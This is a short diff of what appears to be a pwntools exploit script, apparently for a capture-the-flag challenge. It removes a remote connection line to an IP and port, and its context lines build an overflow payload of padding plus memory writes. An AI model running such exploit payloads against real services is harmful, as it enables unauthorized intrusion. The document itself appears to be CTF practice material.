@@ -32,8 +32,6 @@ def write_mem(value, addr):
   return payload
 
 
-conn = remote('61.28.237.24', 30206)
-
 # Write EXEC into SAFE_ADDR
 payload = b"A" * 80  # padding
 payload += write_mem(EXEC[0], SAFE_ADDR)
